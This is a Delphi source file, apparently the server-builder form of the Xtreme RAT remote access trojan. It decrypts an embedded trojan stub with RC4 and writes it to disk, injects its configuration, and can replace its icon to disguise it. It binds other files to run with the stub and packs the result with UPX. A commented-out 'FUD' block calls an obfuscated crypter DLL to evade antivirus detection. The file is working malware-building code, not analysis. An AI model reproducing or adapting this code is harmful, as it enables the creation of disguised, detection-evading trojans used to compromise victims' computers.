unit UnitBuildServer;
{$I Compilar.inc}

interface

uses
  Windows, Messages, UnitFuncoesDiversas, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, Buttons, StdCtrls, ExtCtrls, AdvMemo, IconChanger, UnitMudarIcone, sScrollBox,
  sPanel, unitMain;

type
  TFormBuildServer = class(TForm)
    MainPanel: TsPanel;
    Label2: TLabel;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    Memo1: TAdvMemo;
    ScrollBox1: TsScrollBox;
    Image1: TImage;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    ImageList1: TImageList;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure Label2Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure CheckBox2Click(Sender: TObject);
  private
    { Private declarations }
    ModifiedServer: string;
	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  public
    { Public declarations }
    procedure AtualizarIdiomas;
  end;

var
  FormBuildServer: TFormBuildServer;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures,
  UnitConfigs,
  UnitCryptString,
  UnitSelectProfile,
  UnitCreateServer,
  UnitBinderSettings,
  ShellApi,
  Resources,
  MD5;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormBuildServer.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;  

Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

procedure TFormBuildServer.AtualizarIdiomas;
begin
  CheckBox3.Caption := Traduzidos[84];
  Label2.Caption := Traduzidos[85];
  CheckBox1.Caption := Traduzidos[86];
  CheckBox2.Caption := Traduzidos[87];

  SpeedButton1.Hint := Traduzidos[166];
  SpeedButton2.Hint := Traduzidos[22];
end;

procedure TFormBuildServer.CheckBox2Click(Sender: TObject);
begin
  ModifiedServer := '';
  if CheckBox2.Checked then
  begin
    OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
    OpenDialog1.InitialDir := ExtractFilePath(ParamStr(0));
    OpenDialog1.FileName := '';
    OpenDialog1.Filter := 'Executables (*.exe)|*.exe';

    if Opendialog1.Execute = false then
    begin
      CheckBox2.Checked := False;
      exit;
    end;
    ModifiedServer := Opendialog1.FileName;

    if CheckValidPE(ModifiedServer) = false then
    begin
      ModifiedServer := '';
      CheckBox2.Checked := false;
    end;
  end;
end;

procedure TFormBuildServer.CheckBox3Click(Sender: TObject);
var
  b: boolean;
begin
  b := TCheckBox(sender).Checked;
  Image1.Enabled := b;
  if b = False then Image1.Picture := nil;
end;

procedure TFormBuildServer.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ImageList1.GetBitmap(0, SpeedButton1.Glyph);
  ImageList1.GetBitmap(1, SpeedButton2.Glyph);
end;

procedure TFormBuildServer.FormShow(Sender: TObject);
begin
  AtualizarIdiomas;
  Memo1.Clear;
  Image1.Picture := nil;
  CheckBox3.Checked := False;
  FormCreateServer.InserirDadosNoMemo(Memo1);
end;

procedure TFormBuildServer.Image1Click(Sender: TObject);
var
  TempDir, TempFile: string;
begin
  image1.Picture := nil;

  TempDir := ExtractFilePath(ParamStr(0)) + 'Icons\';

  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := TempDir;
  OpenDialog1.FileName := '';
  OpenDialog1.Filter := 'Executables(*.exe); Icons(*.ico)|*.exe;*.ico';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    ForceDirectories(TempDir);

    if lowercase(sysutils.extractfileext(OpenDialog1.FileName)) = '.ico' then
    begin
      image1.Picture.Icon.LoadFromFile(opendialog1.FileName);
      TempFile := extractfilename(OpenDialog1.FileName);
      TempFile := replacestring(extractfileext(TempFile), '', TempFile);
      TempFile := TempDir + TempFile + '.ico';
      CopyFile(pwChar(OpenDialog1.FileName), pwChar(TempFile), False);
    end else
    if lowercase(sysutils.extractfileext(OpenDialog1.FileName)) = '.exe' then
    begin
      try
        TempFile := extractfilename(OpenDialog1.FileName);
        TempFile := replacestring(extractfileext(TempFile), '', TempFile);
        TempFile := TempDir + TempFile + '.ico';

        SaveApplicationIconGroup(pwidechar(TempFile), pchar(OpenDialog1.FileName));
        except
        begin
          MessageBox(Handle,
                     pwidechar(Traduzidos[121]),
                     pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                     MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
          deletefile(TempFile);
          exit;
        end;
      end;
      if FileExists(TempFile) then
      image1.Picture.Icon.LoadFromFile(TempFile) else
      begin
        MessageBox(Handle,
                   pwidechar(Traduzidos[121]),
                   pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                   MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
        exit;
      end;
    end else exit;
  end else exit;
  if FileExists(TempFile) then
  begin
    if image1.Picture = nil then
    image1.Picture.Icon.LoadFromFile(TempFile);
  end else
  MessageBox(Handle,
             pwidechar(Traduzidos[121]),
             pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
             MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
end;


procedure TFormBuildServer.Label2Click(Sender: TObject);
var
  ConfigFile: WideString;
  TempStr: WideString;
begin
  SaveDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  SaveDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  SaveDialog1.FileName := 'ServerConfig.cfg';
  SaveDialog1.Filter := 'Xtreme Server Config(*.cfg)|*.cfg';
  if SaveDialog1.Execute = false then exit;

  ConfigFile := SaveDialog1.FileName;

  SetLength(TempStr, SizeOf(ConfiguracoesServidor) div 2);
  CopyMemory(@TempStr[1], @ConfiguracoesServidor, SizeOf(ConfiguracoesServidor));
  EnDecryptStrRC4B(@TempStr[1], Length(TempStr) * 2, 'CONFIG');

  CriarArquivo(pWideChar(ConfigFile), pWideChar(TempStr), length(TempStr) * 2);

  if MessageBox(Handle,
             pwidechar(Traduzidos[122] + '?'),
             pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
             MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
  FormCreateServer.SalvarDados(FormCreateServer.SelectedProfile);
end;


procedure TFormBuildServer.SpeedButton1Click(Sender: TObject);
var
  resStream: TResourceStream;
  StubBuffer, StubFile: string;
begin
  SaveDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  SaveDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  SaveDialog1.FileName := 'server.exe';
  SaveDialog1.Filter := 'Executables(*.exe)|*.exe';
  if SaveDialog1.Execute = false then exit;
  StubFile := SaveDialog1.FileName;

  resStream := TResourceStream.Create(hInstance, 'STUB', 'stubfile');
  SetLength(StubBuffer, resStream.Size div 2);
  resStream.Position := 0;
  resStream.Read(StubBuffer[1], resStream.Size);
  EnDecryptStrRC4B(@StubBuffer[1], Length(StubBuffer) * 2, 'XTREME');
  CriarArquivo(StubFile, StubBuffer, resStream.Size);
  resStream.Free;
end;

function WriteBinderSettings(ServerFile: PWideChar; Settings: pointer; Size: int64): boolean;
var
  ResourceHandle: THandle;
  b: boolean;
begin
  Result := False;
  ResourceHandle := BeginUpdateResourceW(ServerFile, False);
  if ResourceHandle <> 0 then
  begin
    Result := UpdateResourceW(ResourceHandle, MakeIntResourceW(10), 'XTREMEBINDER', 0, Settings, Size);
    b := EndUpdateResource(ResourceHandle, False);
    if Result = True then Result := b;
  end;
end;

var
  Iniciar: procedure(ComputerID: ansistring; StubFile: WideString; IconFile: WideString = '');

procedure TFormBuildServer.SpeedButton2Click(Sender: TObject);
type
  TTempData = Record
    Filename: Array[0..260] of WideChar;
    FileSize: int64;
    ExtractTo: integer;
    Action: integer;
    ExecuteAllTime: boolean;
  end;
var
  resStream: TResourceStream;
  StubFile, UPXfile: string;
  i, dwindex: integer;
  StubBuffer, TempStr: string;
  TempConfig: TConfiguracoes;
  TempData: TTempData;
  BinderData: TBinderData;
  s, BinderBuffer: WideString;

  TamanhoOriginal: int64;
  TempUPX: string;
  Size: int64;
  p: pointer;
begin
  if (ModifiedServer <> '') and (FileExists(ModifiedServer) = True) then
  StubFile := ModifiedServer else
  begin
    SaveDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
    SaveDialog1.InitialDir := ExtractFilePath(Paramstr(0));
    SaveDialog1.FileName := 'server.exe';
    SaveDialog1.Filter := 'Executables(*.exe)|*.exe';
    if SaveDialog1.Execute = false then exit;
    StubFile := SaveDialog1.FileName;

    resStream := TResourceStream.Create(hInstance, 'STUB', 'stubfile');
    TamanhoOriginal := resStream.Size;
    SetLength(StubBuffer, resStream.Size div 2);
    resStream.Position := 0;
    resStream.Read(StubBuffer[1], resStream.Size);
    EnDecryptStrRC4B(@StubBuffer[1], Length(StubBuffer) * 2, 'XTREME');
    CriarArquivo(StubFile, StubBuffer, resStream.Size);
    resStream.Free;
  end;

  if (Image1.Picture <> nil) and (CheckBox3.Checked = True) then
  begin
    Image1.Picture.SaveToFile(MyTempFolder + 'TempIcon.ico');
    MudarIcone(StubFile, MyTempFolder + 'TempIcon.ico');
    DeleteFile(MyTempFolder + 'TempIcon.ico');
  end;

  SetLength(TempStr, SizeOf(ConfiguracoesServidor) div 2);
  CopyMemory(@TempStr[1], @ConfiguracoesServidor, SizeOf(ConfiguracoesServidor));
  EnDecryptStrRC4B(@TempStr[1], Length(TempStr) * 2, 'CONFIG');
  CopyMemory(@TempConfig, @TempStr[1], SizeOf(ConfiguracoesServidor));

  if WriteSettings(pWideChar(StubFile), TempConfig) = False then
  begin
    DeleteFile(StubFile);
    MessageBox(Handle,
               pwidechar(Traduzidos[604]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    exit;
  end;
  BinderBuffer := '';

  if FormCreateServer.BinderList.Count > 0 then
  begin
    for i := 0 to FormCreateServer.BinderList.Count - 1 do
    begin
      s := '';
      BinderData := TBinderData(FormCreateServer.BinderList.Objects[i]);
      CopyMemory(@TempData.Filename[0], @BinderData.Filename[0], SizeOf(BinderData.Filename));
      TempData.FileSize := BinderData.FileSize;
      TempData.ExtractTo := BinderData.ExtractTo;
      TempData.Action := BinderData.Action;
      TempData.ExecuteAllTime := BinderData.ExecuteAllTime;
      SetLength(s, SizeOf(TempData));
      CopyMemory(@s[1], @TempData, SizeOf(TempData));
      s := s + BinderData.FileBuffer;
      BinderBuffer := BinderBuffer + s;
    end;
  end;

  if BinderBuffer <> '' then
  begin
    EnDecryptStrRC4B(@BinderBuffer[1], Length(BinderBuffer) * 2, 'BINDER');
    WriteBinderSettings(pWideChar(StubFile), @BinderBuffer[1], Length(BinderBuffer) * 2);
  end;

  // compactar servidor
  if CheckBox1.Checked then
  begin
    UPXfile := MyTempFolder + 'UPXfile.exe';
    resStream := TResourceStream.Create(hInstance, 'UPX', 'upxfile');

    SetLength(TempUPX, resStream.Size div 2);
    resStream.Position := 0;
    resStream.Read(TempUPX[1], resStream.Size);
    EnDecryptStrRC4B(@TempUPX[1], Length(TempUPX) * 2, 'XTREME');
    CriarArquivo(UPXfile, TempUPX, resStream.Size);

    resStream.Free;
    ShellExecute(Handle, nil, PChar('"' + UPXfile + '"'), PChar('"' + StubFile + '"'), '', SW_hide);
    while fileexists(UPXfile) do
    begin
      deletefile(UPXfile);
      sleep(10);
    end;
  end;

  if MessageBox(Handle,
             pwidechar(Traduzidos[122] + '?'),
             pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
             MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
  FormCreateServer.SalvarDados(FormCreateServer.SelectedProfile);

  if FileExists(StubFile) then
  MessageBox(Handle,
             pwidechar(Traduzidos[564]),
             pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
             MB_OK or MB_ICONINFORMATION) else
  MessageBox(Handle,
             pwidechar(Traduzidos[565]),
             pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
             MB_OK or MB_ICONERROR);
             FormCreateServer.Close;
//{$IFDEF XTREMEPRIVATEFUD}
 { if FileExists(StubFile) then
  begin
    resStream := TResourceStream.Create(hInstance, 'DLLCRYPT', 'dllcryptfile');
    TamanhoOriginal := resStream.Size;
    SetLength(StubBuffer, resStream.Size div 2);
    resStream.Position := 0;
    resStream.Read(StubBuffer[1], resStream.Size);
    EnDecryptStrRC4B(@StubBuffer[1], Length(StubBuffer) * 2, 'XTREME');
    CriarArquivo('dllcrypt.dll', StubBuffer, resStream.Size);
    resStream.Free;

    i := LoadLibrary('dllcrypt.dll');
    @Iniciar := GetProcAddress(i, 'jkfvndjvnkdnvfslvjkfskdvnkfs');

    if (Image1.Picture <> nil) and (CheckBox3.Checked = True) then
    begin
      Image1.Picture.SaveToFile(MyTempFolder + 'TempIcon.ico');
      Iniciar(AnsiString(''), StubFile, MyTempFolder + 'TempIcon.ico');
    end else
    Iniciar(AnsiString(''), StubFile);

    FreeLibrary(i);
    DeleteFile('dllcrypt.dll');
    DeleteFile(MyTempFolder + 'TempIcon.ico');
  end; }
//{$ENDIF}

end;

end.
